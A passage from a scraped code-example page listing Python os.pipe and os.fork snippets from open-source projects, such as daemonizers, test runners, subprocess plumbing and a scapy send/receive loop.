        self._id = None
        
        self.exit_flag = False
        self.debug = debug
        
        # Execution Status
        self.more = False
        
        if exitfunc is not None:
            atexit.register(exitfunc)
        
        self.namespace = self.locals
        self.namespace['__name__'] = '__main__'
        self.namespace['execfile'] = self.execfile
        self.namespace['runfile'] = self.runfile
        self.namespace['raw_input'] = self.raw_input_replacement
        self.namespace['help'] = self.help_replacement
                    
        # Capture all interactive input/output 
        self.initial_stdout = sys.stdout
        self.initial_stderr = sys.stderr
        self.initial_stdin = sys.stdin
        
        # Create communication pipes
        pr, pw = os.pipe()
        self.stdin_read = os.fdopen(pr, "r")
        self.stdin_write = os.fdopen(pw, "wb", 0)
        self.stdout_write = Output()
        self.stderr_write = Output()
        
        self.input_condition = threading.Condition()
        self.widget_proxy = WidgetProxy(self.input_condition)
        
        self.redirect_stds()
        

    #------ Standard input/output
     

Example 34
From project basket-lib, under directory packages/mercurial/tests, in source file run-tests.py.
Score: 8
vote
vote
def runchildren(options, tests):
    if INST:
        installhg(options)
        _checkhglib("Testing")

    optcopy = dict(options.__dict__)
    optcopy['jobs'] = 1
    del optcopy['blacklist']
    if optcopy['with_hg'] is None:
        optcopy['with_hg'] = os.path.join(BINDIR, "hg")
    optcopy.pop('anycoverage', None)

    opts = []
    for opt, value in optcopy.iteritems():
        name = '--' + opt.replace('_', '-')
        if value is True:
            opts.append(name)
        elif value is not None:
            opts.append(name + '=' + str(value))

    tests.reverse()
    jobs = [[] for j in xrange(options.jobs)]
    while tests:
        for job in jobs:
            if not tests:
                break
            job.append(tests.pop())
    fps = {}

    for j, job in enumerate(jobs):
        if not job:
            continue
        rfd, wfd = os.pipe()
        childopts = ['--child=%d' % wfd, '--port=%d' % (options.port + j * 3)]
        childtmp = os.path.join(HGTMP, 'child%d' % j)
        childopts += ['--tmpdir', childtmp]
        cmdline = [PYTHON, sys.argv[0]] + opts + childopts + job
        vlog(' '.join(cmdline))
        fps[os.spawnvp(os.P_NOWAIT, cmdline[0], cmdline)] = os.fdopen(rfd, 'r')
        os.close(wfd)
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    failures = 0
    tested, skipped, failed = 0, 0, 0
    skips = []
    fails = []
    while fps:
        pid, status = os.wait()
        fp = fps.pop(pid)
        l = fp.read().splitlines()
        try:
            test, skip, fail = map(int, l[:3])
        except ValueError:
            test, skip, fail = 0, 0, 0
        split = -fail or len(l)
        for s in l[3:split]:
            skips.append(s.split(" ", 1))
        for s in l[split:]:
            fails.append(s.split(" ", 1))
        tested += test
        skipped += skip
        failed += fail
        vlog('pid %d exited, status %d' % (pid, status))
        failures |= status
    print
    if not options.noskips:
        for s in skips:
            print "Skipped %s: %s" % (s[0], s[1])
    for s in fails:
        print "Failed %s: %s" % (s[0], s[1])

    _checkhglib("Tested")
    print "# Ran %d tests, %d skipped, %d failed." % (
        tested, skipped, failed)

    if options.anycoverage:
        outputcoverage(options)
    sys.exit(failures != 0)

 

Example 35
From project shrapnel, under directory test, in source file test_poller.py.
Score: 8
vote
vote
def test_wait_for_interrupted_fired(self):
        # Test KEVENT_STATUS_FIRED
        # This is tricky, need two coroutines to be scheduled at the same time,
        # the first one a normal one and the second one as a result of a kevent
        # firing (in that specific order).
        read_fd1, write_fd1 = os.pipe()
        read_fd2, write_fd2 = os.pipe()
        try:
            read_sock1 = coro.sock(fd=read_fd1)
            read_sock2 = coro.sock(fd=read_fd2)
            # We're going to have two threads.  Since we can't guarantee
            # which one will show up in kqueue first, we'll just have it
            # interrupt the other one, and verify that only one ran.
            sleeper1_thread = None
            sleeper2_thread = None
            sleeper1_data = []
            sleeper2_data = []

            def sleeper1():
                data = read_sock1.read(10)
                sleeper1_data.append(data)
                sleeper2_thread.shutdown()

            def sleeper2():
                data = read_sock2.read(10)
                sleeper2_data.append(data)
                sleeper1_thread.shutdown()

            sleeper1_thread = coro.spawn(sleeper1)
            sleeper2_thread = coro.spawn(sleeper2)

            coro.yield_slice()
            # Both are waiting, wake them both up.
            os.write(write_fd1, 'sleeper1')
            os.write(write_fd2, 'sleeper2')
            coro.yield_slice()
            # Yield again to ensure the shutdown runs.
            coro.yield_slice()

            self.assertTrue(len(sleeper1_data) == 1 or
                            len(sleeper2_data) == 1)
            self.assertTrue(sleeper1_thread.dead)
            self.assertTrue(sleeper2_thread.dead)
        finally:
            os.close(read_fd1)
            os.close(write_fd1)
            os.close(read_fd2)
            os.close(write_fd2)

     

Example 36
From project tpclient-ogre, under directory sandbox/tp/client, in source file subprocess.py.
Score: 8
vote
vote
def _get_handles(self, stdin, stdout, stderr):
            """Construct and return tupel with IO objects:
            p2cread, p2cwrite, c2pread, c2pwrite, errread, errwrite
            """
            p2cread, p2cwrite = None, None
            c2pread, c2pwrite = None, None
            errread, errwrite = None, None

            if stdin is None:
                pass
            elif stdin == PIPE:
                p2cread, p2cwrite = os.pipe()
            elif isinstance(stdin, int):
                p2cread = stdin
            else:
                # Assuming file-like object
                p2cread = stdin.fileno()

            if stdout is None:
                pass
            elif stdout == PIPE:
                c2pread, c2pwrite = os.pipe()
            elif isinstance(stdout, int):
                c2pwrite = stdout
            else:
                # Assuming file-like object
                c2pwrite = stdout.fileno()

            if stderr is None:
                pass
            elif stderr == PIPE:
                errread, errwrite = os.pipe()
            elif stderr == STDOUT:
                errwrite = c2pwrite
            elif isinstance(stderr, int):
                errwrite = stderr
            else:
                # Assuming file-like object
                errwrite = stderr.fileno()

            return (p2cread, p2cwrite,
                    c2pread, c2pwrite,
                    errread, errwrite)


         

Example 37
From project kgsgo-dataset-preprocessor-master, under directory thirdparty/future/tests/test_future, in source file test_builtins.py.
Score: 8
vote
vote
def check_input_tty(self, prompt, terminal_input, stdio_encoding=None):
        if not sys.stdin.isatty() or not sys.stdout.isatty():
            self.skipTest("stdin and stdout must be ttys")
        r, w = os.pipe()
        try:
            pid, fd = pty.fork()
        except (OSError, AttributeError) as e:
            os.close(r)
            os.close(w)
            self.skipTest("pty.fork() raised {0}".format(e))
        if pid == 0:
            # Child
            try:
                # Make sure we don't get stuck if there's a problem
                signal.alarm(2)
                os.close(r)
                # Check the error handlers are accounted for
                if stdio_encoding:
                    sys.stdin = io.TextIOWrapper(sys.stdin.detach(),
                                                 encoding=stdio_encoding,
                                                 errors='surrogateescape')
                    sys.stdout = io.TextIOWrapper(sys.stdout.detach(),
                                                  encoding=stdio_encoding,
                                                  errors='replace')
                with open(w, "w") as wpipe:
                    print("tty =", sys.stdin.isatty() and sys.stdout.isatty(), file=wpipe)
                    print(ascii(input(prompt)), file=wpipe)
            except:
                traceback.print_exc()
            finally:
                # We don't want to return to unittest...
                os._exit(0)
        # Parent
        os.close(w)
        os.write(fd, terminal_input + b"\r\n")
        # Get results from the pipe
        with open(r, "r") as rpipe:
            lines = []
            while True:
                line = rpipe.readline().strip()
                if line == "":
                    # The other end was closed => the child exited
                    break
                lines.append(line)
        # Check the result was got and corresponds to the user's terminal input
        if len(lines) != 2:
            # Something went wrong, try to get at stderr
            with open(fd, "r", encoding="ascii", errors="ignore") as child_output:
                self.fail("got %d lines in pipe but expected 2, child output was:\n%s"
                          % (len(lines), child_output.read()))
        os.close(fd)
        # Check we did exercise the GNU readline path
        self.assertIn(lines[0], set(['tty = True', 'tty = False']))
        if lines[0] != 'tty = True':
            self.skipTest("standard IO in should have been a tty")
        input_result = eval(lines[1])   # ascii() -> eval() roundtrip
        if stdio_encoding:
            expected = terminal_input.decode(stdio_encoding, 'surrogateescape')
        else:
            expected = terminal_input.decode(sys.stdin.encoding)  # what else?
        self.assertEqual(input_result, expected)

     

Example 38
From project xen, under directory tools/python/xen/util, in source file utils.py.
Score: 8
vote
vote
def daemonize(prog, args, stdin_tmpfile=None):
    """Runs a program as a daemon with the list of arguments.  Returns the PID
    of the daemonized program, or returns 0 on error.
    """
    r, w = os.pipe()
    pid = os.fork()

    if pid == 0:
        os.close(r)
        w = os.fdopen(w, 'w')
        os.setsid()
        try:
            pid2 = os.fork()
        except:
            pid2 = None
        if pid2 == 0:
            os.chdir("/")
            null_fd = os.open("/dev/null", os.O_RDWR)
            if stdin_tmpfile is not None:
                os.dup2(stdin_tmpfile.fileno(), 0)
            else:
                os.dup2(null_fd, 0)
            os.dup2(null_fd, 1)
            os.dup2(null_fd, 2)
            for fd in range(3, 256):
                try:
                    os.close(fd)
                except:
                    pass
            os.execvp(prog, args)
            os._exit(1)
        else:
            w.write(str(pid2 or 0))
            w.close()
            os._exit(0)
    os.close(w)
    r = os.fdopen(r)
    daemon_pid = int(r.read())
    r.close()
    os.waitpid(pid, 0)
    return daemon_pid

# Global variable to store the sysfs mount point
 

Example 39
From project mozbuilds, under directory mozilla-build/python/Lib/test, in source file test_signal.py.
Score: 8
vote
vote
def test_main(self):
        # This function spawns a child process to insulate the main
        # test-running process from all the signals. It then
        # communicates with that child process over a pipe and
        # re-raises information about any exceptions the child
        # raises. The real work happens in self.run_test().
        os_done_r, os_done_w = os.pipe()
        with closing(os.fdopen(os_done_r)) as done_r, \
             closing(os.fdopen(os_done_w, 'w')) as done_w:
            child = os.fork()
            if child == 0:
                # In the child process; run the test and report results
                # through the pipe.
                try:
                    done_r.close()
                    # Have to close done_w again here because
                    # exit_subprocess() will skip the enclosing with block.
                    with closing(done_w):
                        try:
                            self.run_test()
                        except:
                            pickle.dump(traceback.format_exc(), done_w)
                        else:
                            pickle.dump(None, done_w)
                except:
                    print 'Uh oh, raised from pickle.'
                    traceback.print_exc()
                finally:
                    exit_subprocess()

            done_w.close()
            # Block for up to MAX_DURATION seconds for the test to finish.
            r, w, x = select.select([done_r], [], [], self.MAX_DURATION)
            if done_r in r:
                tb = pickle.load(done_r)
                if tb:
                    self.fail(tb)
            else:
                os.kill(child, signal.SIGKILL)
                self.fail('Test deadlocked after %d seconds.' %
                          self.MAX_DURATION)


 

Example 40
From project sabayon, under directory lib, in source file protosession.py.
Score: 7
vote
vote
def __open_x_connection (self, display_name, xauth_file):
        (pipe_r, pipe_w) = os.pipe ()
        pid = os.fork ()
        if pid == 0: # Child process
            os.close (pipe_r)
            new_environ = os.environ.copy ()
            new_environ["DISPLAY"] = display_name
            new_environ["XAUTHORITY"] = xauth_file
            argv = [ "python", "-c",
                     "import gtk, os, sys; os.write (int (sys.argv[1]), 'Y'); gtk.main ()" ,
                     str (pipe_w) ]
            os.execvpe (argv[0], argv, new_environ)
        os.close (pipe_w)
        while True:
            try:
                select.select ([pipe_r], [], [])
                break
            except select.error, (err, errstr):
                if err != errno.EINTR:
                    raise
        os.close (pipe_r)

    #
    # FIXME: we have a re-entrancy issue here - if while we're
    # runing the mainloop we re-enter, then we'll install another
    # SIGUSR1 handler and everything will break
    #
     

Example 41
From project adv-net-samples-master, under directory sdn/pox/pox/lib, in source file util.py.
Score: 5
vote
vote
def make_pinger ():
  """
  A pinger is basically a thing to let you wake a select().

  On Unix systems, this makes a pipe pair.  But on Windows, select() only
  works with sockets, so it makes a pair of connected sockets.
  """

  class PipePinger (object):
    def __init__ (self, pair):
      self._w = pair[1]
      self._r = pair[0]
      assert os is not None

    def ping (self):
      if os is None: return #TODO: Is there a better fix for this?
      os.write(self._w, ' ')

    def fileno (self):
      return self._r

    def pongAll (self):
      #TODO: make this actually read all
      os.read(self._r, 1024)

    def pong (self):
      os.read(self._r, 1)

    def __del__ (self):
      try:
        os.close(self._w)
      except:
        pass
      try:
        os.close(self._r)
      except:
        pass

    def __repr__ (self):
      return "<%s %i/%i>" % (self.__class__.__name__, self._w, self._r)

  class SocketPinger (object):
    def __init__ (self, pair):
      self._w = pair[1]
      self._r = pair[0]
    def ping (self):
      self._w.send(' ')
    def pong (self):
      self._r.recv(1)
    def pongAll (self):
      #TODO: make this actually read all
      self._r.recv(1024)
    def fileno (self):
      return self._r.fileno()
    def __repr__ (self):
      return "<%s %s/%s>" % (self.__class__.__name__, self._w, self._r)

  #return PipePinger((os.pipe()[0],os.pipe()[1]))  # To test failure case

  if os.name == "posix":
    return PipePinger(os.pipe())

  #TODO: clean up sockets?
  localaddress = '127.127.127.127'
  startPort = 10000

  import socket
  import select

  def tryConnect ():
    l = socket.socket()
    l.setblocking(0)

    port = startPort
    while True:
      try:
        l.bind( (localaddress, port) )
        break
      except:
        port += 1
        if port - startPort > 1000:
          raise RuntimeError("Could not find a free socket")
    l.listen(0)

    r = socket.socket()

    try:
      r.connect((localaddress, port))
    except:
      import traceback
      ei = sys.exc_info()
      ei = traceback.format_exception_only(ei[0], ei[1])
      ei = ''.join(ei).strip()
      log.warning("makePinger: connect exception:\n" + ei)
      return False

    rlist, wlist,elist = select.select([l], [], [l], 2)
    if len(elist):
      log.warning("makePinger: socket error in select()")
      return False
    if len(rlist) == 0:
      log.warning("makePinger: socket didn't connect")
      return False

    try:
      w, addr = l.accept()
    except:
      return False

    #w.setblocking(0)
    if addr != r.getsockname():
      log.info("makePinger: pair didn't connect to each other!")
      return False

    r.setblocking(1)

    # Turn off Nagle
    r.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    w.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    return (r, w)

  # Try a few times
  for i in range(0, 3):
    result = tryConnect()
    if result is not False:
      return SocketPinger(result)

  raise RuntimeError("Could not allocate a local socket pair")
 

Example 42
From project social-engineer-toolkit, under directory src/core, in source file scapy.py.
Score: 5
vote
vote
def sndrcv(pks, pkt, timeout = 2, inter = 0, verbose=None, chainCC=0, retry=0, multi=0):
    if not isinstance(pkt, Gen):
        pkt = SetGen(pkt)

    if verbose is None:
        verbose = conf.verb
    debug.recv = PacketList([],"Unanswered")
    debug.sent = PacketList([],"Sent")
    debug.match = SndRcvList([])
    nbrecv=0
    ans = []
    # do it here to fix random fields, so that parent and child have the same
    all_stimuli = tobesent = [p for p in pkt]
    notans = len(tobesent)

    hsent={}
    for i in tobesent:
        h = i.hashret()
        if h in hsent:
            hsent[h].append(i)
        else:
            hsent[h] = [i]
    if retry < 0:
        retry = -retry
        autostop=retry
    else:
        autostop=0


    while retry >= 0:
        found=0

        if timeout < 0:
            timeout = None

        rdpipe,wrpipe = os.pipe()
        rdpipe=os.fdopen(rdpipe)
        wrpipe=os.fdopen(wrpipe,"w")

        pid=1
        try:
            pid = os.fork()
            if pid == 0:
                try:
                    sys.stdin.close()
                    rdpipe.close()
                    try:
                        i = 0
                        if verbose:
                            print "Begin emission:"
                        for p in tobesent:
                            pks.send(p)
                            i += 1
                            time.sleep(inter)
                        if verbose:
                            print "Finished to send %i packets." % i
                    except SystemExit:
                        pass
                    except KeyboardInterrupt:
                        pass
                    except:
                        log_runtime.exception("--- Error in child %i" % os.getpid())
                        log_runtime.info("--- Error in child %i" % os.getpid())
                finally:
                    try:
                        os.setpgrp() # Chance process group to avoid ctrl-C
                        sent_times = [p.sent_time for p in all_stimuli if p.sent_time]
                        cPickle.dump( (arp_cache,sent_times), wrpipe )
                        wrpipe.close()
                    except:
                        pass
            elif pid < 0:
                log_runtime.error("fork error")
            else:
                wrpipe.close()
                stoptime = 0
                remaintime = None
                inmask = [rdpipe,pks]
                try:
                    try:
                        while 1:
                            if stoptime:
                                remaintime = stoptime-time.time()
                                if remaintime <= 0:
                                    break
                            r = None
                            if FREEBSD or DARWIN:
                                inp, out, err = select(inmask,[],[], 0.05)
                                if len(inp) == 0 or pks in inp:
                                    r = pks.nonblock_recv()
                            else:
                                inp, out, err = select(inmask,[],[], remaintime)
                                if len(inp) == 0:
                                    break
                                if pks in inp:
                                    r = pks.recv(MTU)
                            if rdpipe in inp:
                                if timeout:
                                    stoptime = time.time()+timeout
                                del(inmask[inmask.index(rdpipe)])
                            if r is None:
                                continue
                            ok = 0
                            h = r.hashret()
                            if h in hsent:
                                hlst = hsent[h]
                                for i in range(len(hlst)):
                                    if r.answers(hlst[i]):
                                        ans.append((hlst[i],r))
                                        if verbose > 1:
                                            os.write(1, "*")
                                        ok = 1
                                        if not multi:
                                            del(hlst[i])
                                            notans -= 1;
                                        else:
                                            if not hasattr(hlst[i], '_answered'):
                                                notans -= 1;
                                            hlst[i]._answered = 1;
                                        break
                            if notans == 0 and not multi:
                                break
                            if not ok:
                                if verbose > 1:
                                    os.write(1, ".")
                                nbrecv += 1
                                if conf.debug_match:
                                    debug.recv.append(r)
                    except KeyboardInterrupt:
                        if chainCC:
                            raise
                finally:
                    try:
                        ac,sent_times = cPickle.load(rdpipe)
                    except EOFError:
                        warning("Child died unexpectedly. Packets may have not been sent %i"%os.getpid())
                    else:
                        arp_cache.update(ac)
                        for p,t in zip(all_stimuli, sent_times):
                            p.sent_time = t
                    os.waitpid(pid,0)
        finally:
            if pid == 0:
                os._exit(0)

        remain = reduce(list.__add__, hsent.values(), [])
        if multi:
            remain = filter(lambda p: not hasattr(p, '_answered'), remain);

        if autostop and len(remain) > 0 and len(remain) != len(tobesent):
            retry = autostop

        tobesent = remain
        if len(tobesent) == 0:
            break
        retry -= 1

    if conf.debug_match:
        debug.sent=PacketList(remain[:],"Sent")
        debug.match=SndRcvList(ans[:])

    #clean the ans list to delete the field _answered
    if (multi):
        for s,r in ans:
            if hasattr(s, '_answered'):
                del(s._answered)

    if verbose:
        print "\nReceived %i packets, got %i answers, remaining %i packets" % (nbrecv+len(ans), len(ans), notans)
    return SndRcvList(ans),PacketList(remain,"Unanswered"),debug.recv


 

Example 43
From project coconut-shell, under directory , in source file shell_spawn.py.
Score: 5
vote
vote
def make_pipe():
    read_fd, write_fd = os.pipe()
    return os.fdopen(read_fd, "r", 0), os.fdopen(write_fd, "w", 0)
 

Example 44
From project xen, under directory tools/python/xen/xend/server, in source file SrvDaemon.py.
Score: 5
vote
vote
def start(self, trace=0):
        """Attempts to start the daemons.
        The return value is defined by the LSB:
        0  Success
        4  Insufficient privileges
        """
        xend_pid = self.cleanup_xend(False)

        if self.set_user():
            return 4
        os.chdir("/")

        if xend_pid > 0:
            # Trying to run an already-running service is a success.
            return 0

        ret = 0

        # If we're not going to create a daemon, simply
        # call the run method right here.
        if not XEND_DAEMONIZE:
            self.tracing(trace)
            self.run(None)
            return ret
        
        # we use a pipe to communicate between the parent and the child process
        # this way we know when the child has actually initialized itself so
        # we can avoid a race condition during startup
        
        r,w = os.pipe()
        if os.fork():
            os.close(w)
            r = os.fdopen(r, 'r')
            try:
                s = r.read()
            finally:
                r.close()
            if not len(s):
                ret = 1
            else:
                ret = int(s)
        else:
            os.close(r)
            # Child
            self.daemonize()
            self.tracing(trace)

            # If Xend proper segfaults, then we want to restart it.  Thus,
            # we fork a child for running Xend itself, and if it segfaults
            # (or exits any way other than cleanly) then we run it again.
            # The first time through we want the server to write to the (r,w)
            # pipe created above, so that we do not exit until the server is
            # ready to receive requests.  All subsequent restarts we don't
            # want this behaviour, or the pipe will eventually fill up, so
            # we just pass None into run in subsequent cases (by clearing w
            # in the parent of the first fork).  On some operating systems,
            # restart is managed externally, so we won't fork, and just exit.
            while True:

                if not osdep.xend_autorestart:
                    self.run(os.fdopen(w, 'w'))
                    os._exit(0)

                pid = self.fork_pid()
                if pid:
                    if w is not None:
                        os.close(w)
                        w = None

                    (_, status) = os.waitpid(pid, 0)

                    if os.WIFEXITED(status):
                        code = os.WEXITSTATUS(status)
                        log.info('Xend exited with status %d.', code)
                        sys.exit(code)

                    if os.WIFSIGNALED(status):
                        sig = os.WTERMSIG(status)

                        if sig in (signal.SIGINT, signal.SIGTERM):
                            log.info('Xend stopped due to signal %d.', sig)
                            sys.exit(0)
                        else:
                            log.fatal(
                                'Xend died due to signal %d!  Restarting it.',
                                sig)
                else:
                    self.run(w and os.fdopen(w, 'w') or None)
                    # if we reach here, the child should quit.
                    os._exit(0)

        return ret

     

}

#Python os.fork Examples
{
Python os.fork Examples

The following are 49 code examples for showing how to use os.fork. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project play1, under directory python/Lib, in source file pty.py.
Score: 22
vote
vote
def fork():
    """fork() -> (pid, master_fd)
    Fork and make the child a session leader with a controlling terminal."""

    try:
        pid, fd = os.forkpty()
    except (AttributeError, OSError):
        pass
    else:
        if pid == CHILD:
            try:
                os.setsid()
            except OSError:
                # os.forkpty() already set us session leader
                pass
        return pid, fd

    master_fd, slave_fd = openpty()
    pid = os.fork()
    if pid == CHILD:
        # Establish a new session.
        os.setsid()
        os.close(master_fd)

        # Slave becomes stdin/stdout/stderr of child.
        os.dup2(slave_fd, STDIN_FILENO)
        os.dup2(slave_fd, STDOUT_FILENO)
        os.dup2(slave_fd, STDERR_FILENO)
        if (slave_fd > STDERR_FILENO):
            os.close (slave_fd)

        # Explicitly open the tty to make it become a controlling tty.
        tmp_fd = os.open(os.ttyname(STDOUT_FILENO), os.O_RDWR)
        os.close(tmp_fd)
    else:
        os.close(slave_fd)

    # Parent and child process.
    return pid, master_fd

 
Example 2
From project hipl, under directory hipfwmi, in source file FirewallController.py.
Score: 19
vote
vote
def daemonize(self):
        """Makeself a daemon process.

        Double fork, close standard pipes, start a new session and
        open logs.
        """
        pid = os.fork()
        if pid == 0:  # first child
            os.setsid()
            pid = os.fork()
            if pid == 0:  # second child
                # Can't chdir to root if we have relative paths to
                # conffile and other modules
                #os.chdir('/')
                os.umask(0)
            else:
                os._exit(0)
        else:
            os._exit(0)

        # close stdin, stdout and stderr ...
        for fd in range(3):
            try:
                os.close(fd)
            except OSError:
                pass
        # ... and replace them with /dev/null
        os.open('/dev/null', os.O_RDWR)
        os.dup(0)
        os.dup(0)

        syslog.openlog('hip-mgmt-iface',
                       syslog.LOG_PID | syslog.LOG_NDELAY,
                       syslog.LOG_DAEMON)
        syslog.syslog('FirewallController started.')

     
Example 3
From project murder, under directory dist, in source file murder_client.py.
Score: 10
vote
vote
def finished(self):
        global doneFlag
      
        self.done = True
        self.percentDone = '100'
        self.timeEst = 'Download Succeeded!'
        self.downRate = ''
        #self.display()
        
        global isPeer
        
        print "done and done"
        
        if isPeer:
          if os.fork():
            os._exit(0)
            return

          os.setsid()
          if os.fork():
            os._exit(0)
            return

          os.close(0)
          os.close(1)
          os.close(2)

          t = threading.Timer(30.0, ok_close_now)
          t.start()
        
     

 
Example 4
From project fabric, under directory tests, in source file Python26SocketServer.py.
Score: 10
vote
vote
def process_request(self, request, client_address):
        """Fork a new subprocess to process the request."""
        self.collect_children()
        pid = os.fork()
        if pid:
            # Parent process
            if self.active_children is None:
                self.active_children = []
            self.active_children.append(pid)
            self.close_request(request)
            return
        else:
            # Child process.
            # This must never return, hence os._exit()!
            try:
                self.finish_request(request, client_address)
                os._exit(0)
            except:
                try:
                    self.handle_error(request, client_address)
                finally:
                    os._exit(1)


 
Example 5
From project moblin-image-creator.jaunty, under directory libs, in source file pdk_utils.py.
Score: 10
vote
vote
def copy(src, dst, callback = None):
    if callback:
        timer = gobject.timeout_add(100, callback, None)
        pid = os.fork()
        if (pid == 0):
            # child process
            shutil.copy(src, dst)
            os._exit(0)
        while 1:
            pid, exit_status = os.waitpid(pid, os.WNOHANG)
            if pid == 0:
                callback(None)
                time.sleep(0.1)
            else:
                gobject.source_remove(timer)
                break
            if exit_status:
                # Something failed, try again without the fork
                shutil.copy(src, dst)
    else:
        shutil.copy(src, dst)

 
Example 6
From project hipl, under directory tools, in source file dnsproxy.py.
Score: 10
vote
vote
def forkme(gp):
        pid = os.fork()
        if pid:
            return False
        else:
            # we are the child
            global myid
            myid = '%d-%d' % (time.time(),os.getpid())
            gp.logger.setsyslog()
            return True

     
Example 7
From project hubjs, under directory tools/scons/scons-local-1.2.0/SCons/Platform, in source file posix.py.
Score: 10
vote
vote
def exec_fork(l, env): 
    pid = os.fork()
    if not pid:
        # Child process.
        exitval = 127
        try:
            os.execvpe(l[0], l, env)
        except OSError, e:
            exitval = exitvalmap.get(e[0], e[0])
            sys.stderr.write("scons: %s: %s\n" % (l[0], e[1]))
        os._exit(exitval)
    else:
        # Parent process.
        pid, stat = os.waitpid(pid, 0)
        if stat & 0xff:
            return stat | 0x80
        return stat >> 8

 
Example 8
From project searchlight-master, under directory searchlight/common, in source file wsgi.py.
Score: 10
vote
vote
def run_child(self):
        def child_hup(*args):
            """Shuts down child processes, existing requests are handled."""
            signal.signal(signal.SIGHUP, signal.SIG_IGN)
            eventlet.wsgi.is_accepting = False
            self.sock.close()

        pid = os.fork()
        if pid == 0:
            signal.signal(signal.SIGHUP, child_hup)
            signal.signal(signal.SIGTERM, signal.SIG_DFL)
            # ignore the interrupt signal to avoid a race whereby
            # a child worker receives the signal before the parent
            # and is respawned unnecessarily as a result
            signal.signal(signal.SIGINT, signal.SIG_IGN)
            # The child has no need to stash the unwrapped
            # socket, and the reference prevents a clean
            # exit on sighup
            self._sock = None
            self.run_server()
            LOG.info(_LI('Child %d exiting normally') % os.getpid())
            # self.pool.waitall() is now called in wsgi's server so
            # it's safe to exit here
            sys.exit(0)
        else:
            LOG.info(_LI('Started child %s') % pid)
            self.children.add(pid)

     
Example 9
From project play1, under directory python/Lib, in source file SocketServer.py.
Score: 10
vote
vote
def process_request(self, request, client_address):
        """Fork a new subprocess to process the request."""
        self.collect_children()
        pid = os.fork()
        if pid:
            # Parent process
            if self.active_children is None:
                self.active_children = []
            self.active_children.append(pid)
            self.close_request(request)
            return
        else:
            # Child process.
            # This must never return, hence os._exit()!
            try:
                self.finish_request(request, client_address)
                os._exit(0)
            except:
                try:
                    self.handle_error(request, client_address)
                finally:
                    os._exit(1)


 
Example 10
From project play1, under directory python/Lib/multiprocessing, in source file forking.py.
Score: 10
vote
vote
def __init__(self, process_obj):
            sys.stdout.flush()
            sys.stderr.flush()
            self.returncode = None

            self.pid = os.fork()
            if self.pid == 0:
                if 'random' in sys.modules:
                    import random
                    random.seed()
                code = process_obj._bootstrap()
                sys.stdout.flush()
                sys.stderr.flush()
                os._exit(code)

         
Example 11
From project play1, under directory python/Lib/site-packages/Rpyc/Servers, in source file forking_server.py.
Score: 10
vote
vote
def serve_in_child(sock):
    """forks a child to run the server in. the parent doesnt wait() for the child, 
    so if you do a `ps`, you'll see zombies. but who cares. i used to do a doublefork()
    for that, but it's really meaningless. anyway, when the parent dies, the zombies
    die as well."""
    if os.fork() == 0:
        try:
            serve_socket(sock)
        finally:
            sys.exit()

 
Example 12
From project spksrc, under directory spk/subliminal/src/app, in source file scanner.py.
Score: 10
vote
vote
def daemonize(self):
        """Do the UNIX double-fork magic, see Stevens' "Advanced
        Programming in the UNIX Environment" for details (ISBN 0201563177)
        http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16

        """
        try:
            pid = os.fork()
            if pid > 0:  # exit first parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #1 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)

        # decouple from parent environment
        os.chdir('/')
        os.setsid()
        os.umask(0)

        # do second fork
        try:
            pid = os.fork()
            if pid > 0:  # exit from second parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #2 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)
    
     
Example 13
From project spksrc, under directory spk/subliminal/src/app, in source file scheduler.py.
Score: 10
vote
vote
def daemonize(self):
        """Do the UNIX double-fork magic, see Stevens' "Advanced
        Programming in the UNIX Environment" for details (ISBN 0201563177)
        http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16

        """
        try:
            pid = os.fork()
            if pid > 0:  # exit first parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #1 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)

        # decouple from parent environment
        os.chdir('/')
        os.setsid()
        os.umask(0)

        # do second fork
        try:
            pid = os.fork()
            if pid > 0:  # exit from second parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #2 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)

        # write pidfile
        atexit.register(self.delpid)
        file(self.pidfile, 'w+').write('%s\n' % str(os.getpid()))

     
Example 14
From project exscript, under directory src/Exscript/util, in source file sigint.py.
Score: 10
vote
vote
def __init__(self):
        """
        Creates a child process, which returns. The parent
        process waits for a KeyboardInterrupt and then kills
        the child process.
        """
        try:
            self.child = os.fork()
        except RuntimeError:
            pass # prevent "not holding the import lock" on some systems.
        if self.child == 0:
            return
        else:
            self.watch()

     
Example 15
From project exscript, under directory src/Exscript/util, in source file daemonize.py.
Score: 10
vote
vote
def daemonize():
    """
    Forks and daemonizes the current process. Does not automatically track
    the process id; to do this, use L{Exscript.util.pidutil}.
    """
    sys.stdout.flush()
    sys.stderr.flush()

    # UNIX double-fork magic. We need to fork before any threads are
    # created.
    pid = os.fork()
    if pid > 0:
        # Exit first parent.
        sys.exit(0)

    # Decouple from parent environment.
    os.chdir('/')
    os.setsid()
    os.umask(0)

    # Now fork again.
    pid = os.fork()
    if pid > 0:
        # Exit second parent.
        sys.exit(0)

    _redirect_output(os.devnull)
 
Example 16
From project phantomjs, under directory src/breakpad/src/tools/gyp/test/lib, in source file TestCmd.py.
Score: 10
vote
vote
def __init__(self, cmd, bufsize=-1):
                    p2cread, p2cwrite = os.pipe()
                    c2pread, c2pwrite = os.pipe()
                    self.pid = os.fork()
                    if self.pid == 0:
                        # Child
                        os.dup2(p2cread, 0)
                        os.dup2(c2pwrite, 1)
                        os.dup2(c2pwrite, 2)
                        for i in range(3, popen2.MAXFD):
                            try:
                                os.close(i)
                            except: pass
                        try:
                            os.execvp(cmd[0], cmd)
                        finally:
                            os._exit(1)
                        # Shouldn't come here, I guess
                        os._exit(1)
                    os.close(p2cread)
                    self.tochild = os.fdopen(p2cwrite, 'w', bufsize)
                    os.close(c2pwrite)
                    self.fromchild = os.fdopen(c2pread, 'r', bufsize)
